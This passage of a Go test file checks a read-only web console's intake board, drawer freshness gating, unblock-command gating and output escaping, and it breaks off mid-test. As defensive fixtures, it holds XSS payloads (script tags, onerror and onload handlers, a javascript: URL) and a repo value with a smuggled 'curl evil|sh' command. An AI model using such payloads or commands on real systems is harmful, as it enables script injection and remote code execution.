	if !strings.Contains(out, "recent intakes") {
		t.Error("rail must render the section header \"recent intakes\"")
	}

	// hx-get is an HTML attribute value; templ's attribute escaping renders
	// "&" as "&amp;" (correct, browser-decodable HTML), so the query-string
	// "&" between run/stage params must be matched in its escaped form.
	linkedURL := strings.ReplaceAll(consoleIssueScanCardURL(OpsCivilizationIssueScanKanbanCard{RunID: "run_linked", StageID: "stage_linked"}), "&", "&amp;")
	if !strings.Contains(out, `<a`) || !strings.Contains(out, `hx-get="`+linkedURL+`"`) {
		t.Error("linked entry must render an <a> with hx-get set to its DrawerURL")
	}
	if !strings.Contains(out, `hx-target="#console-intake-drawer"`) {
		t.Error("linked entry must target #console-intake-drawer")
	}
	if !strings.Contains(out, `hx-swap="innerHTML"`) {
		t.Error("linked entry must hx-swap innerHTML")
	}
	if !strings.Contains(out, "transpara-ai/site#42") {
		t.Error("linked chip must show its IssueLabel")
	}
	if !strings.Contains(out, "transpara-ai/site#43") {
		t.Error("unlinked chip must show its IssueLabel")
	}

	// The unlinked entry must render as a <span>, not an <a>/hx-get, for its
	// own chip. Scope the check to the rail region to avoid false negatives
	// from the board's own <a> usage elsewhere on the surface.
	railStart := strings.Index(out, "data-console-rail")
	if railStart == -1 {
		t.Fatal("rail marker not found; cannot scope unlinked-chip assertion")
	}
	// The board section (a sibling, not a descendant) follows the rail; bound
	// the search to the rail's own chip strip using the section header as the
	// left edge and the truncation-free single-rail assumption here (no
	// truncation marker in this fixture).
	railRegion := out[railStart:]
	if boardIdx := strings.Index(railRegion, `data-console-surface`); boardIdx != -1 {
		railRegion = railRegion[:boardIdx]
	}
	unlinkedURL := strings.ReplaceAll(consoleIssueScanCardURL(OpsCivilizationIssueScanKanbanCard{RunID: "run_unlinked", StageID: "stage_unlinked"}), "&", "&amp;")
	if strings.Contains(railRegion, `hx-get="`+unlinkedURL+`"`) {
		t.Error("unlinked entry must not render an hx-get drawer link")
	}
}

// TestConsoleRecentRunsRailAbsentWhenUnavailableByteIdentical is the plan's
// byte-equality guard: when RecentRuns.Available is false, the intake surface
// must render byte-identical HTML to the same projection with the
// RecentRuns section entirely absent (zero value) — i.e. the rail leaves
// truly zero trace, not just a visually-empty container.
func TestConsoleRecentRunsRailAbsentWhenUnavailableByteIdentical(t *testing.T) {
	base := ConsoleIssueScan{
		Freshness:   FreshnessCurrent,
		GeneratedAt: "2026-07-02T09:00:00Z",
		Summary:     "1 run(s) projected.",
		Board: OpsCivilizationIssueScanKanban{
			Columns: []OpsCivilizationIssueScanKanbanColumn{
				{Label: "Parked", Cards: []OpsCivilizationIssueScanKanbanCard{
					{RunID: "run_a", StageID: "stage_a", TargetIssue: OpsCivilizationIssueRef{Repo: "transpara-ai/site", Number: 1}},
				}},
			},
		},
	}

	withRecentRunsZero := base
	withRecentRunsZero.RecentRuns = ConsoleRecentRuns{}

	withRecentRunsFalseButPopulated := base
	withRecentRunsFalseButPopulated.RecentRuns = ConsoleRecentRuns{
		Available: false,
		// Entries populated despite Available=false must never surface: this
		// only happens if a caller misuses the type, but the template itself
		// must gate on Available, not on len(Entries).
		Entries: []ConsoleRecentRunEntry{{RunID: "should_never_render", IssueLabel: "should-not-appear"}},
	}

	var bufZero, bufFalsePopulated bytes.Buffer
	if err := consoleIssueScan(withRecentRunsZero).Render(context.Background(), &bufZero); err != nil {
		t.Fatalf("render (zero RecentRuns): %v", err)
	}
	if err := consoleIssueScan(withRecentRunsFalseButPopulated).Render(context.Background(), &bufFalsePopulated); err != nil {
		t.Fatalf("render (Available=false, populated Entries): %v", err)
	}

	if bufZero.String() != bufFalsePopulated.String() {
		t.Fatal("intake surface must render byte-identical HTML whether RecentRuns is the zero value or Available=false with stray entries")
	}
	if strings.Contains(bufZero.String(), "data-console-rail") {
		t.Error("data-console-rail must be ABSENT when RecentRuns.Available is false")
	}
	if strings.Contains(bufFalsePopulated.String(), "should-not-appear") {
		t.Error("a stray populated entry under Available=false must never render")
	}
}

// TestConsoleRecentRunsRailUnknownStateNeutralVerbatim mirrors the view-model
// guard (TestBuildConsoleRecentRunsUnknownStateNeutralVerbatim) at the render
// layer: an unknown/future state value must render escaped verbatim with the
// neutral class, never substituted, hidden, or colored amber by a default.
func TestConsoleRecentRunsRailUnknownStateNeutralVerbatim(t *testing.T) {
	scan := ConsoleIssueScan{
		Freshness: FreshnessCurrent,
		RecentRuns: ConsoleRecentRuns{
			Available: true,
			Entries: []ConsoleRecentRunEntry{
				{RunID: "run_x", IssueLabel: "transpara-ai/site#7", State: "ready_for_human", StyleKind: "neutral"},
			},
		},
	}
	var buf bytes.Buffer
	if err := consoleIssueScan(scan).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render: %v", err)
	}
	out := buf.String()
	if !strings.Contains(out, "ready_for_human") {
		t.Error("unknown state must render verbatim, not substituted or hidden")
	}
	if !strings.Contains(out, "text-warm-muted") {
		t.Error("unknown/neutral StyleKind must render with text-warm-muted, not an amber class")
	}
	if strings.Contains(out, "text-amber-300") {
		t.Error("neutral StyleKind must never render the amber class")
	}
}

// TestConsoleRecentRunsRailTruncatedMarker asserts the trailing "… truncated"
// marker renders iff Truncated is set.
func TestConsoleRecentRunsRailTruncatedMarker(t *testing.T) {
	truncated := ConsoleIssueScan{
		Freshness: FreshnessCurrent,
		RecentRuns: ConsoleRecentRuns{
			Available: true,
			Truncated: true,
			Entries:   []ConsoleRecentRunEntry{{RunID: "run_x", IssueLabel: "transpara-ai/site#7", State: "queued", StyleKind: "neutral"}},
		},
	}
	notTruncated := truncated
	notTruncated.RecentRuns.Truncated = false

	var bufT, bufN bytes.Buffer
	if err := consoleIssueScan(truncated).Render(context.Background(), &bufT); err != nil {
		t.Fatalf("render truncated: %v", err)
	}
	if err := consoleIssueScan(notTruncated).Render(context.Background(), &bufN); err != nil {
		t.Fatalf("render not truncated: %v", err)
	}
	if !strings.Contains(bufT.String(), "truncated") {
		t.Error("Truncated=true must render the truncation marker")
	}
	if strings.Contains(bufN.String(), "truncated") {
		t.Error("Truncated=false must NOT render the truncation marker")
	}
}

func TestConsoleIssueScanBoardHidesSummaryWhenUnavailable(t *testing.T) {
	// A failed/unavailable scan still carries board.Summary (e.g. "No typed
	// issue-scan projection records are present"). Rendering that above the
	// unavailable notice is a comforting default — suppress it when unavailable.
	scan := ConsoleIssueScan{
		Freshness: FreshnessUnavailable,
		Summary:   "No typed issue-scan projection records are present",
		Notices:   []string{"hive civilization projection returned 503"},
	}
	var buf bytes.Buffer
	if err := consoleIssueScan(scan).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render: %v", err)
	}
	out := buf.String()
	if strings.Contains(out, "No typed issue-scan projection records are present") {
		t.Error("unavailable board must not render a comforting summary")
	}
	if !strings.Contains(out, "unavailable") || !strings.Contains(out, "503") {
		t.Error("unavailable board must render the honest unavailable notice")
	}
}

func TestConsoleIssueScanFragmentResetsDrawerUnlessCurrent(t *testing.T) {
	// The drawer can hold operator label-surgery commands (e.g. gh issue edit)
	// that are only ever offered from a verified-current projection
	// (buildConsoleIssueScan gates the unblock plan to FreshnessCurrent). So
	// any poll that reports the projection is no longer verified-current must
	// clear an open drawer, or a stale/partial/unavailable poll could leave a
	// now-invalid command sitting in the DOM, copyable. This is a class fix
	// over the whole freshness domain: allowlist the single proven-safe
	// preserve branch (current) rather than denylist known-bad states, so an
	// unrecognized/future freshness value clears the drawer too, never
	// preserves it.
	tests := []struct {
		name          string
		freshness     ConsoleFreshness
		wantDrawerOOB bool
	}{
		{
			name:          "current preserves the open drawer",
			freshness:     FreshnessCurrent,
			wantDrawerOOB: false,
		},
		{
			name:          "stale clears the open drawer",
			freshness:     FreshnessStale,
			wantDrawerOOB: true,
		},
		{
			name:          "partial clears the open drawer",
			freshness:     FreshnessPartial,
			wantDrawerOOB: true,
		},
		{
			name:          "unavailable clears the open drawer",
			freshness:     FreshnessUnavailable,
			wantDrawerOOB: true,
		},
		{
			name:          "unrecognized freshness value clears the open drawer",
			freshness:     ConsoleFreshness("some-future-state"),
			wantDrawerOOB: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			scan := ConsoleIssueScan{Freshness: tt.freshness, GeneratedAt: time.Now().UTC().Format(time.RFC3339)}
			if tt.freshness != FreshnessCurrent {
				scan.Notices = []string{"down"}
			}
			var buf bytes.Buffer
			if err := consoleIssueScanFragment(scan).Render(context.Background(), &buf); err != nil {
				t.Fatalf("render: %v", err)
			}
			out := buf.String()

			// The board surface always renders regardless of freshness.
			if !strings.Contains(out, `data-console-surface="intake"`) {
				t.Error("fragment must always render the intake board surface")
			}

			hasDrawerOOB := strings.Contains(out, "hx-swap-oob") && strings.Contains(out, `id="console-intake-drawer"`)
			if hasDrawerOOB != tt.wantDrawerOOB {
				t.Errorf("freshness=%q: drawer OOB reset present=%v, want=%v", tt.freshness, hasDrawerOOB, tt.wantDrawerOOB)
			}
		})
	}
}

func TestConsoleIssueScanCardStatesNoMergeWhenReady(t *testing.T) {
	card := OpsCivilizationIssueScanKanbanCard{
		RunID:        "run_ready",
		StageID:      "surface_ready_for_human_result_pr",
		CurrentState: "ready_for_human",
		TargetIssue:  OpsCivilizationIssueRef{Repo: "transpara-ai/site", Number: 400},
	}
	var buf bytes.Buffer
	if err := consoleIssueScanCard(card).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render: %v", err)
	}
	if !strings.Contains(buf.String(), "not merged") {
		t.Error("a ready_for_human card must state the no-merge boundary")
	}
}

func TestConsoleIssueScanCardOmitsNoMergeWhenNotReady(t *testing.T) {
	card := OpsCivilizationIssueScanKanbanCard{RunID: "r", StageID: "s", CurrentState: "parked"}
	var buf bytes.Buffer
	if err := consoleIssueScanCard(card).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render: %v", err)
	}
	if strings.Contains(buf.String(), "not merged") {
		t.Error("a non-ready card must not claim a no-merge boundary")
	}
}

func TestConsoleIntakeUnavailableWhenProjectionAbsent(t *testing.T) {
	t.Setenv("HIVE_OPS_API_BASE_URL", "") // no upstream configured -> nil projection

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body: %s", w.Code, w.Body.String())
	}
	body := w.Body.String()
	if !strings.Contains(body, "unavailable") {
		t.Error("absent projection must render an explicit unavailable state")
	}
	// No fabricated cards from the fixture may appear.
	if strings.Contains(body, "transpara-ai/docs#172") {
		t.Error("unavailable board must not fabricate issue-scan cards")
	}
}

func TestConsoleIntakeTabEnabled(t *testing.T) {
	t.Setenv("HIVE_OPS_API_BASE_URL", "")
	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	body := w.Body.String()
	// The enabled Intake tab is an anchor to /console/intake, not a disabled span.
	if !strings.Contains(body, `href="/console/intake"`) {
		t.Error("Intake tab must be enabled (anchor to /console/intake)")
	}
}

func TestConsoleIntakeCardDrawerRendersPossessionAndLineage(t *testing.T) {
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/hive/civilization/assembly-projection" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, hiveCivilizationAssemblyProjectionFixture)
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	// run_docs_172 / run_adversarial_review is a parked stage with agent_reviewer in the fixture.
	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake/card?run=run_docs_172&stage=run_adversarial_review", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body: %s", w.Code, w.Body.String())
	}
	body := w.Body.String()
	for _, want := range []string{"agent_reviewer", "run_adversarial_review", "Run details"} {
		if !strings.Contains(body, want) {
			t.Errorf("drawer missing %q", want)
		}
	}
}

func TestConsoleIntakeCardDrawerUnknownIsHonestNotFound(t *testing.T) {
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, hiveCivilizationAssemblyProjectionFixture)
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake/card?run=nope&stage=nope", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", w.Code)
	}
	if !strings.Contains(w.Body.String(), "not found") {
		t.Error("unknown card must render an honest not-found drawer")
	}
}

// TestConsoleIntakeSurfaceEscapesHostileProjectionData is a characterization/
// regression guard for the Intake surface (Build 1 relocation of the
// issue-scan board to /console/intake). The old surface it replaced had
// exhaustive XSS/escaping tests; this closes the gap for the new one. templ's
// default `{ }` interpolation HTML-escapes everything, and this surface uses
// no templ.Raw/SafeHTML, so hostile operator-visible projection strings must
// come out escaped on both the board card and the run-details drawer.
func TestConsoleIntakeSurfaceEscapesHostileProjectionData(t *testing.T) {
	const runID = "run_hostile"
	const stageID = "stage_hostile"

	proj := &OpsCivilizationAssemblyProjection{
		DerivationStatus: "complete",
		GeneratedAt:      time.Now().UTC().Add(-5 * time.Second),
		IssueScanProjection: OpsCivilizationIssueScanProjection{
			Runs: []OpsCivilizationIssueScanRunProjected{{
				RunID: runID,
				TargetIssue: OpsCivilizationIssueRef{
					Repo:   "transpara-ai/x",
					Number: 900,
					Title:  "<script>alert('title')</script>",
					URL:    "javascript:alert('url')", // drawer renders this as a link — must be sanitized
				},
			}},
			Stages: []OpsCivilizationIssueScanStageProjected{{
				RunID:             runID,
				StageID:           stageID,
				CurrentState:      "parked",
				AuthorityBoundary: `<button onclick="x">auth</button>`,
				AssignedAgentIDs:  []string{"<img src=x onerror=y>agent"},
			}},
			Blockers: []OpsCivilizationIssueScanBlockerProjected{{
				RunID:          runID,
				StageID:        stageID,
				BlockerType:    `<form action="/hive">block</form>`,
				RequiredAction: `<form action="/hive">block</form>`,
			}},
			Lineage: []OpsCivilizationIssueScanLineageProjected{{
				RunID:         runID,
				StageID:       stageID,
				PrimaryTaskID: "<script>lineage()</script>",
			}},
		},
		RecentIssueScanRuns: OpsCivilizationRecentIssueScanRuns{
			Status: "available",
			Runs: []OpsCivilizationRecentIssueScanRun{{
				RunID:       runID,
				StageID:     stageID,
				Repo:        `<svg onload=alert('repo')>x/y</svg>`,
				IssueNumber: 900,
				IssueTitle:  "<script>alert('rail-title')</script>",
				State:       `<img src=x onerror=alert('rail-state')>`,
			}},
		},
	}

	// Render the board (which includes the recent-intakes rail).
	scan := buildConsoleIssueScan(proj, time.Now().UTC())
	var buf bytes.Buffer
	if err := consoleIssueScan(scan).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render board: %v", err)
	}

	// Render the drawer for the first card produced by the same projection.
	board := opsCivilizationIssueScanKanban(proj)
	if len(board.Columns) == 0 || len(board.Columns[0].Cards) == 0 {
		t.Fatal("hostile fixture produced zero cards; fixture is wrong, not the surface")
	}
	card := board.Columns[0].Cards[0]
	var buf2 bytes.Buffer
	if err := consoleIssueScanDrawer(card, true, consoleUnblockPlan{}, false).Render(context.Background(), &buf2); err != nil {
		t.Fatalf("render drawer: %v", err)
	}

	boardOut := buf.String()
	drawerOut := buf2.String()
	combined := boardOut + drawerOut

	// Match the raw hostile payloads verbatim, not bare tag prefixes: the
	// surface's OWN chrome legitimately emits a real `<button ...>` element
	// (the clickable card) and this must not be confused with a leaked
	// hostile `<button onclick="x">`. Matching the exact injected string is
	// unambiguous — it only appears if the surface failed to escape it.
	rawHostile := []string{
		`<script>alert('title')</script>`,
		`<button onclick="x">auth</button>`,
		`<form action="/hive">block</form>`,
		"<img src=x onerror=y>agent",
		"<script>lineage()</script>",
		"javascript:alert('url')", // the drawer's issue-link href must be sanitized by templ.URL
		`<svg onload=alert('repo')>x/y</svg>`,
		"<script>alert('rail-title')</script>",
		"<img src=x onerror=alert('rail-state')>",
	}
	for _, raw := range rawHostile {
		if strings.Contains(combined, raw) {
			t.Errorf("hostile raw markup %q survived escaping in the intake surface; board+drawer output leaked unescaped projection data", raw)
		}
	}

	if !strings.Contains(boardOut, "&lt;script") {
		t.Error("expected escaped form \"&lt;script\" in board output; escaping did not occur (data may have vanished instead of being escaped)")
	}
}

// End-to-end through the real handler + shared fixture: the cleanly
// label-parked run offers the exact commands; terminal-run copy present.
func TestConsoleIntakeDrawerRendersUnblockCommands(t *testing.T) {
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, freshHiveCivilizationAssemblyProjectionFixture())
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake/card?run=run_docs_172_scope&stage=select_and_design_approach", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("status = %d", w.Code)
	}
	body := w.Body.String()
	for _, want := range []string{
		"gh issue edit 172 --repo transpara-ai/docs --remove-label cc:needs-human-scope --add-label cc:pr-ready",
		"A parked run is terminal.",
		"hive factory scan-issues --human YOUR_NAME --repo transpara-ai/docs",
		"--dispatch",
	} {
		if !strings.Contains(body, want) {
			t.Errorf("drawer missing %q", want)
		}
	}
	if strings.Contains(body, "protected-action boundary") {
		t.Error("protected warning rendered though no protected label is on docs#172")
	}
}

// End-to-end negative: run_site_115 has sibling blockers protected_action +
// stale_target, so the gate must refuse — no command anywhere, projected
// required action still shown. Uses the FRESH fixture (FreshnessCurrent)
// deliberately: this test asserts the sibling-blocker GATE refuses, not the
// freshness gate (which has its own dedicated coverage in
// TestConsoleIntakeStaleProjectionSuppressesUnblock). A stale fixture here
// would make the assertion trivially true for the wrong reason.
func TestConsoleIntakeDrawerNoCommandForNonLabelBlocker(t *testing.T) {
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, freshHiveCivilizationAssemblyProjectionFixture())
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake/card?run=run_site_115&stage=surface_ready_for_human_result_pr", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	body := w.Body.String()
	if strings.Contains(body, "gh issue edit") {
		t.Error("gate must refuse commands for a run with a sibling non-label blocker (stale_target)")
	}
	if !strings.Contains(body, "human must authorize protected repo action") {
		t.Error("projected RequiredAction must still render when the gate refuses")
	}
}

// CFAR (codex, PR #203, P2): buildConsoleIssueScan stamped UnblockAvailable —
// and handleConsoleIntakeCard derived/rendered the plan — from ANY freshness
// other than FreshnessUnavailable, so a stale projection's out-of-date label
// snapshot could still produce exact "gh issue edit" commands. This test
// serves the shared fixture AS-IS (its baked-in generated_at is
// "2026-06-23T09:30:00Z", which is FreshnessStale against any realistic test
// clock — see freshHiveCivilizationAssemblyProjectionFixture's doc comment)
// and asserts the board still renders honestly (cards, required actions) but
// the gate suppresses every unblock hint and command.
func TestConsoleIntakeStaleProjectionSuppressesUnblock(t *testing.T) {
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, hiveCivilizationAssemblyProjectionFixture) // stale, deliberately unmodified
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	boardReq := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake", nil)
	boardW := httptest.NewRecorder()
	mux.ServeHTTP(boardW, boardReq)
	if boardW.Code != http.StatusOK {
		t.Fatalf("board status = %d, want 200; body: %s", boardW.Code, boardW.Body.String())
	}
	boardBody := boardW.Body.String()
	if !strings.Contains(boardBody, "transpara-ai/docs#172") {
		t.Error("stale board must still render its cards honestly (data, not commands, is suppressed)")
	}
	if strings.Contains(boardBody, "unblock available") {
		t.Error("stale board must not render the unblock hint — the label snapshot is out of date")
	}

	drawerReq := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake/card?run=run_docs_172_scope&stage=select_and_design_approach", nil)
	drawerW := httptest.NewRecorder()
	mux.ServeHTTP(drawerW, drawerReq)
	if drawerW.Code != http.StatusOK {
		t.Fatalf("drawer status = %d, want 200; body: %s", drawerW.Code, drawerW.Body.String())
	}
	drawerBody := drawerW.Body.String()
	if !strings.Contains(drawerBody, "human must clarify issue scope before runtime continues") {
		t.Error("stale drawer must still show the projected required action honestly")
	}
	if strings.Contains(drawerBody, "gh issue edit") {
		t.Error("stale drawer must NOT render a gh command — the label snapshot may be out of date")
	}
}

// Board hint appears exactly once with the shared fixture: only
// run_docs_172_scope passes the gate (run_docs_172 = duplicate_chain,
// run_site_115 = protected_action + stale_target siblings).
func TestConsoleIntakeCardUnblockHint(t *testing.T) {
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, freshHiveCivilizationAssemblyProjectionFixture())
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	if got := strings.Count(w.Body.String(), "unblock available"); got != 1 {
		t.Errorf("unblock hint count = %d, want exactly 1 (only run_docs_172_scope passes the gate)", got)
	}
}

// Component-level: cc:protected-action renders as its own warned command,
// never folded into the scope command.
func TestConsoleIntakeDrawerSplitsProtectedCommand(t *testing.T) {
	card := unblockCard("run-split", "needs_human_scope", []string{"cc:needs-human-scope", "cc:protected-action"})
	plan, ok := consoleIssueScanUnblockPlan(card, consoleIssueScanRunBlockerTypes(boardWith(card)))
	if !ok {
		t.Fatal("expected plan for label-parked card")
	}
	var buf bytes.Buffer
	if err := consoleIssueScanDrawer(card, true, plan, true).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render: %v", err)
	}
	body := buf.String()
	for _, want := range []string{
		"gh issue edit 226 --repo transpara-ai/docs --remove-label cc:needs-human-scope --add-label cc:pr-ready",
		"gh issue edit 226 --repo transpara-ai/docs --remove-label cc:protected-action",
		"run it only if you authorize the protected action",
	} {
		if !strings.Contains(body, want) {
			t.Errorf("split drawer missing %q", want)
		}
	}
	for _, forbid := range []string{
		"--remove-label cc:needs-human-scope --remove-label cc:protected-action",
		"--remove-label cc:protected-action --add-label",
	} {
		if strings.Contains(body, forbid) {
			t.Errorf("protected removal folded into another command: %q", forbid)
		}
	}
}

func TestConsoleIntakeEmptyStateExplainsScanCycle(t *testing.T) {
	// A complete, fresh projection with zero issue-scan AND zero issue-intake
	// records is a genuinely usable-but-empty board (verified via
	// issueScanKanbanFromIssueIntakeFallback: with no issue_intake_projection
	// issues either, it returns zero columns rather than fabricating fallback
	// cards). The empty state must teach how runs get here.
	emptyProjection := fmt.Sprintf(`{
		"projection_schema_version": "1.0.0",
		"projection_subject": "civilization_assembly",
		"derivation_status": "complete",
		"generated_at": %q,
		"issue_scan_projection": {}
	}`, time.Now().UTC().Format(time.RFC3339))

	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/hive/civilization/assembly-projection" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, emptyProjection)
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body: %s", w.Code, w.Body.String())
	}
	body := w.Body.String()
	for _, want := range []string{"No issue-scan runs projected.", "hive factory scan-issues", "cc:pr-ready"} {
		if !strings.Contains(body, want) {
			t.Errorf("empty intake body missing %q; body: %s", want, body)
		}
	}
}

// READ-ONLY BOUNDARY: the intake surface — full page, fragment, and an open
// unblock drawer — must carry zero write affordances. The unblock section is
// selectable copy-paste text, never a control; the only governed write route
// (/ops/hive/model-policy) must not leak here in any form. Card-open buttons
// and the drawer close button are legitimately type="button" and are NOT
// asserted absent — only form/hx-write/submit/write-route markers are.
func TestConsoleIntakeSurfaceRendersNoWriteControls(t *testing.T) {
	// Splice in an available recent_issue_scan_runs section (schema 1.6.0) so
	// the rail actually renders for this fixture — otherwise this test could
	// pass vacuously without ever exercising the rail's own markup for write
	// affordances.
	railSection := `{"status": "available", "runs": [{"run_id": "run_docs_172_scope", "stage_id": "select_and_design_approach", "repo": "transpara-ai/docs", "issue_number": 172, "state": "parked", "last_event_at": "2026-06-23T09:29:00Z"}]}`
	fixtureWithRail := spliceRecentIssueScanRunsSection(t, freshHiveCivilizationAssemblyProjectionFixture(), railSection)

	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, fixtureWithRail)
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	bodies := map[string]string{}
	for name, target := range map[string]string{
		"page":     "http://site.test/console/intake",
		"fragment": "http://site.test/console/intake/fragment",
		// run_docs_172_scope / select_and_design_approach is the fixture card
		// whose gate passes: its unblock section renders real commands, so
		// this is the strongest case for a leaked write control.
		"drawer": "http://site.test/console/intake/card?run=run_docs_172_scope&stage=select_and_design_approach",
	} {
		req := httptest.NewRequest(http.MethodGet, target, nil)
		w := httptest.NewRecorder()
		mux.ServeHTTP(w, req)
		if w.Code != http.StatusOK {
			t.Fatalf("%s: status = %d", name, w.Code)
		}
		bodies[name] = w.Body.String()
	}

	// Sanity: the drawer actually rendered the unblock command, so a passing
	// no-write-controls assertion below isn't vacuous (nothing to leak).
	if !strings.Contains(bodies["drawer"], "gh issue edit 172 --repo transpara-ai/docs") {
		t.Fatal("drawer fixture must render the unblock command, or this test proves nothing")
	}
	// Sanity: the rail itself actually rendered on the page/fragment, so the
	// no-write-controls assertion below actually exercises rail markup.
	if !strings.Contains(bodies["page"], "data-console-rail") {
		t.Fatal("page fixture must render the recent-intakes rail, or this test proves nothing about rail write-controls")
	}
	if !strings.Contains(bodies["fragment"], "data-console-rail") {
		t.Fatal("fragment fixture must render the recent-intakes rail, or this test proves nothing about rail write-controls")
	}

	for name, body := range bodies {
		lower := strings.ToLower(body)
		for _, forbidden := range []string{
			"<form", "hx-post", "hx-put", "hx-delete", "hx-patch",
			`type="submit"`, "/ops/hive/model-policy",
		} {
			if strings.Contains(lower, strings.ToLower(forbidden)) {
				t.Errorf("%s: read-only intake surface must not render %q", name, forbidden)
			}
		}
	}
}

// Hostile projection data must neither escape into markup nor produce a
// command. Two hostile target repos share one run each: one carries HTML
// injection, the other shell metacharacters. consoleUnblockRepoPattern is a
// strict owner/repo allowlist (graph/console_unblock.go), so both refuse to
// render ANY command — this asserts the fail-closed GATE, not just escaping.
func TestConsoleIntakeUnblockGateRefusesHostileData(t *testing.T) {
	const runHTML = "run_hostile_html_226"
	const runShell = "run_hostile_shell_226"
	const stageHTML = "select_and_design_approach"
	const stageShell = "select_and_design_approach"
	const repoHTML = `transpara-ai/docs"><script>alert(1)</script>`
	const repoShell = `transpara-ai/docs; curl evil|sh`

	fixture := fmt.Sprintf(`{
		"projection_schema_version": "1.0.0",
		"projection_subject": "civilization_assembly",
		"derivation_status": "complete",
		"generated_at": %q,
		"issue_scan_projection": {
			"runs": [
				{
					"run_id": %q,
					"state": "human_action",
					"target_issue": {"repo": %q, "number": 226, "labels": ["cc:needs-human-scope"]}
				},
				{
					"run_id": %q,
					"state": "human_action",
					"target_issue": {"repo": %q, "number": 226, "labels": ["cc:needs-human-scope"]}
				}
			],
			"stages": [
				{"run_id": %q, "stage_id": %q, "current_state": "human_action"},
				{"run_id": %q, "stage_id": %q, "current_state": "human_action"}
			],
			"blockers": [
				{"run_id": %q, "stage_id": %q, "blocker_type": "needs_human_scope", "required_action": "human must clarify issue scope"},
				{"run_id": %q, "stage_id": %q, "blocker_type": "needs_human_scope", "required_action": "human must clarify issue scope"}
			]
		}
	}`,
		time.Now().UTC().Format(time.RFC3339),
		runHTML, repoHTML,
		runShell, repoShell,
		runHTML, stageHTML,
		runShell, stageShell,
		runHTML, stageHTML,
		runShell, stageShell,
	)

